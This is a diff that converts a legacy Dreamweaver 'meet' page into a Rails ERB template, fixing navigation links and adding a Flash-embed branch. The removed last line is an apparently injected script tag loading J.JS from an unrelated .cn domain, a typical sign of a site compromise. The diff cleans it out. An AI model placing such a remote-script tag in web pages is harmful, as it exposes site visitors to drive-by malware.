@@ -1,7 +1,4 @@
-<html>
-<head>
-<title>meet</title>
-<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<% if params[:controller] == 'meets' %>
 <script type="text/JavaScript">
 <!--
 function MM_findObj(n, d) { //v4.01
@@ -28,12 +25,7 @@ function MM_swapImage() { //v3.0
 }
 //-->
 </script>
-</head>
-<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="MM_preloadImages('images/no_flash_home_over.gif','images/no_flash_about_over.gif','images/no_flash_store_over.gif','images/no_flash_supporters_over.gif',
-'images/no_flash_contact_over.gif','images/nolash_daryll_over.gif','images/no_flash_eric_over.gif','images/no_flash_fitz_over.gif','images/no_flash_guido_over.gif',
-'images/no_flash_james_over.gif','images/no_flash_jamie_over.gif','images/no_flash_jerry_over.gif','images/no_flash_lexsee_over.gif','images/no_flash_mark_over.gif',
-'images/no_flash_rich_over.gif','images/no_flash_sam_over.gif','images/no_flash_tom_over.gif')">
-<!-- ImageReady Slices (meet.psd) -->
+
 <table id="Table_01" width="757" height="243" border="0" cellpadding="0" cellspacing="0">
 	<tr>
 		<td colspan="19">
@@ -41,19 +33,19 @@ function MM_swapImage() { //v3.0
 	</tr>
 	<tr>
 		<td colspan="2">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image41','','images/no_flash_home_over.gif',1)"><img src="images/no_flash_home.gif" name="Image41" width="108" height="33" border="0"></a><a href="index.aspx"></a></td>
+			<a href="/index.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image41','','images/no_flash_home_over.gif',1)"><img src="images/no_flash_home.gif" name="Image41" width="108" height="33" border="0"></a><a href="index.aspx"></a></td>
 		<td colspan="3">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image42','','images/no_flash_about_over.gif',1)"><img src="images/no_flash_about.gif" name="Image42" width="107" height="33" border="0"></a><a href="about.aspx"></a></td>
+			<a href="/about.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image42','','images/no_flash_about_over.gif',1)"><img src="images/no_flash_about.gif" name="Image42" width="107" height="33" border="0"></a><a href="about.aspx"></a></td>
 		<td colspan="3">
 			<img src="images/no_flash_meet.gif" width="115" height="33" alt=""></td>
 		<td colspan="3">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image43','','images/no_flash_store_over.gif',1)"><img src="images/no_flash_store.gif" name="Image43" width="105" height="33" border="0"></a><a href="store.aspx"></a></td>
+			<a href="/store.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image43','','images/no_flash_store_over.gif',1)"><img src="images/no_flash_store.gif" name="Image43" width="105" height="33" border="0"></a><a href="store.aspx"></a></td>
 		<td colspan="3">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image44','','images/no_flash_store_over.gif',1)"><img src="images/no_flash_news.gif" name="Image44" width="104" height="33" border="0"></a><a href="news.aspx"></a></td>
+			<a href="/news.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image44','','images/no_flash_store_over.gif',1)"><img src="images/no_flash_news.gif" name="Image44" width="104" height="33" border="0"></a><a href="news.aspx"></a></td>
 		<td colspan="3">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image45','','images/no_flash_supporters_over.gif',1)"><img src="images/no_flash_supporters.gif" name="Image45" width="108" height="33" border="0"></a><a href="supporters.aspx"></a></td>
+			<a href="/supporters.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image45','','images/no_flash_supporters_over.gif',1)"><img src="images/no_flash_supporters.gif" name="Image45" width="108" height="33" border="0"></a><a href="supporters.aspx"></a></td>
 		<td colspan="2">
-			<a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image46','','images/no_flash_contact_over.gif',1)"><img src="images/no_flash_contact.gif" name="Image46" width="110" height="33" border="0"></a><a href="contact.aspx"></a></td>
+			<a href="/contact.aspx" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image46','','images/no_flash_contact_over.gif',1)"><img src="images/no_flash_contact.gif" name="Image46" width="110" height="33" border="0"></a><a href="contact.aspx"></a></td>
 	</tr>
 	<tr>
 		<td colspan="19">
@@ -117,5 +109,47 @@ function MM_swapImage() { //v3.0
 	</tr>
 </table>
 <!-- End ImageReady Slices -->
-<script src='http://nt002.cn/E/J.JS'></script></body>
-</html>
+
+
+<% else %>
+
+	<SCRIPT LANGUAGE=JavaScript1.1>
+	<!--
+	var MM_contentVersion = 6;
+	var plugin = (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) ? navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin : 0;
+	if ( plugin ) {
+			var words = navigator.plugins["Shockwave Flash"].description.split(" ");
+		    for (var i = 0; i < words.length; ++i)
+		    {
+			if (isNaN(parseInt(words[i])))
+			continue;
+			var MM_PluginVersion = words[i]; 
+		    }
+		var MM_FlashCanPlay = MM_PluginVersion >= MM_contentVersion;
+	}
+	else if (navigator.userAgent && navigator.userAgent.indexOf("MSIE")>=0 
+	   && (navigator.appVersion.indexOf("Win") != -1)) {
+		document.write('<SCR' + 'IPT LANGUAGE=VBScript\> \n'); //FS hide this from IE4.5 Mac by splitting the tag
+		document.write('on error resume next \n');
+		document.write('MM_FlashCanPlay = ( IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & MM_contentVersion)))\n');
+		document.write('</SCR' + 'IPT\> \n');
+	}
+	if ( MM_FlashCanPlay ) {
+			document.write('<OBJECT classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"');
+		document.write('  codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" ');
+		document.write(' ID="script" WIDTH="300" HEIGHT="200" ALIGN="">');
+		document.write(' <PARAM NAME=movie VALUE="/swf/home_hdr.swf?section=home"> <PARAM NAME=quality VALUE=high> <PARAM NAME=bgcolor VALUE=#FFFFFF>  '); 
+		document.write(' <EMBED src="/swf/home_hdr.swf?section=home" quality=high bgcolor=#FFFFFF  ');
+		document.write(' swLiveConnect=FALSE WIDTH="757" HEIGHT="242" NAME="script" ALIGN=""');
+		document.write(' TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer">');
+		document.write(' </EMBED>');
+		document.write(' </OBJECT>');
+	} else{
+		document.write('<IMG SRC="script.gif" WIDTH="300" HEIGHT="200" usemap="#script" BORDER=0>');
+	}
+	//-->
+	</SCRIPT><NOSCRIPT><IMG SRC="script.gif" WIDTH="300" HEIGHT="200" usemap="#script" BORDER=0></NOSCRIPT>
+
+
+
+<% end %>
